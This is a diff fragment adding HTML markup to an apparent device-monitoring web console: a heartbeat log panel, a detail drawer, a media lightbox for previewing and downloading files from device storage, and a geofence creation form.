+              </div>
+            </div>
+            <div style="margin-top: 20px; padding: 14px; background: rgba(0,0,0,0.2); border-radius: 8px;">
+              <h4 style="margin-bottom: 8px;">Recent Communications Heartbeats</h4>
+              <div id="health-heartbeat-log" style="font-family: monospace; font-size: 0.85rem; color: var(--text-muted);">
+                <!-- Populated dynamically -->
+              </div>
             </div>
           </div>
         </div>
@@ -492,6 +1018,79 @@
       </div>
       <div class="modal-footer">
         <button id="btn-regen-code" class="btn btn-secondary">Generate New Code</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- DETAIL SLIDE-OUT DRAWER OVERLAY -->
+  <div id="slide-drawer" class="drawer-overlay">
+    <div class="drawer-header">
+      <h3 id="drawer-title" style="margin: 0; text-transform: uppercase; letter-spacing: 0.5px; font-size: 0.95rem;">Drawer Details</h3>
+      <button class="btn-icon" onclick="closeConsoleDrawer()" style="font-size: 1.5rem; line-height: 1;">&times;</button>
+    </div>
+    <div class="drawer-body" id="drawer-content-body">
+      <!-- Dynamic details rendered here -->
+    </div>
+  </div>
+
+  <!-- HIGH-END MEDIA LIGHTBOX MODAL -->
+  <div id="media-lightbox" class="modal-overlay hidden" style="background: rgba(0,0,0,0.92); z-index: 1200;">
+    <div class="modal-card" style="max-width: 90%; width: 640px; padding: 15px; border: 1px solid rgba(255,255,255,0.15); background: rgba(15,23,42,0.9); backdrop-filter: blur(20px);">
+      <div class="modal-header" style="border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
+        <h3 id="lightbox-title" style="font-size: 1rem; color: #fff; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 80%;">Media Preview</h3>
+        <button class="btn-icon" onclick="closeMediaLightbox()" style="font-size: 1.4rem;">&times;</button>
+      </div>
+      <div class="modal-body" style="display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 0; gap: 15px;">
+        <div id="lightbox-content-preview" style="max-height: 380px; width: 100%; display: flex; align-items: center; justify-content: center; overflow: hidden; border-radius: 8px; background: #000; border: 1px solid rgba(255,255,255,0.05);">
+          <!-- Dynamic image or video loaded here -->
+        </div>
+        <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; font-size: 0.82rem; color: var(--text-muted);">
+          <span id="lightbox-file-size">-- KB</span>
+          <span id="lightbox-file-path" style="font-family: monospace; opacity: 0.7; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 70%;">/storage/emulated/0/...</span>
+        </div>
+      </div>
+      <div class="modal-footer" style="border-top: 1px solid rgba(255,255,255,0.08); padding-top: 12px; display: flex; justify-content: flex-end; gap: 10px;">
+        <a id="lightbox-download-btn" href="#" download class="btn btn-primary" style="background: var(--cyan); border-color: var(--cyan); text-decoration: none; display: inline-flex; align-items: center; gap: 6px; font-size: 0.85rem; padding: 6px 16px;">
+          📥 Download Original
+        </a>
+        <button onclick="closeMediaLightbox()" class="btn btn-secondary" style="font-size: 0.85rem; padding: 6px 14px;">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- GEOFENCE CREATION MODAL -->
+  <div id="geofence-modal" class="modal-overlay hidden" style="background: rgba(0,0,0,0.85); z-index: 1200;">
+    <div class="modal-card" style="max-width: 500px; width: 95%; padding: 20px; background: #0f172a; border: 1px solid rgba(255,255,255,0.15); border-radius: 12px;">
+      <div class="modal-header" style="border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
+        <h3 style="margin: 0; font-size: 1.1rem; color: #fff;">Define Geofence Boundary</h3>
+        <button class="btn-icon" onclick="closeAddGeofenceModal()" style="font-size: 1.4rem;">&times;</button>
+      </div>
+      <div class="modal-body" style="display: flex; flex-direction: column; gap: 14px; padding: 16px 0;">
+        <div class="form-group">
+          <label style="font-size: 0.82rem; color: #94a3b8; display: block; margin-bottom: 4px;">Zone Name / Description</label>
+          <input type="text" id="geo-input-name" class="input-inline" style="width: 100%;" placeholder="e.g., Safe Zone HQ, Warehouse Alpha" />
+        </div>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+          <div class="form-group">
+            <label style="font-size: 0.82rem; color: #94a3b8; display: block; margin-bottom: 4px;">Latitude</label>
+            <input type="number" step="any" id="geo-input-lat" class="input-inline" style="width: 100%;" placeholder="37.7749" />
+          </div>
+          <div class="form-group">
+            <label style="font-size: 0.82rem; color: #94a3b8; display: block; margin-bottom: 4px;">Longitude</label>
+            <input type="number" step="any" id="geo-input-lng" class="input-inline" style="width: 100%;" placeholder="-122.4194" />
+          </div>
+        </div>
+        <div class="form-group">
+          <label style="font-size: 0.82rem; color: #94a3b8; display: block; margin-bottom: 4px;">Perimeter Radius (Meters)</label>
+          <input type="number" id="geo-input-radius" class="input-inline" style="width: 100%;" value="500" min="50" max="50000" />
+        </div>
+        <div style="display: flex; gap: 8px;">
+          <button type="button" class="btn btn-secondary btn-sm" onclick="populateGeofenceWithCurrentLocation()">Use Current Device Position</button>
+        </div>
+      </div>
+      <div class="modal-footer" style="border-top: 1px solid rgba(255,255,255,0.1); padding-top: 14px; display: flex; justify-content: flex-end; gap: 10px;">
+        <button onclick="closeAddGeofenceModal()" class="btn btn-secondary">Cancel</button>
+        <button onclick="submitNewGeofence()" class="btn btn-primary" style="background: var(--primary);">Save Geofence</button>
       </div>
     </div>
   </div>
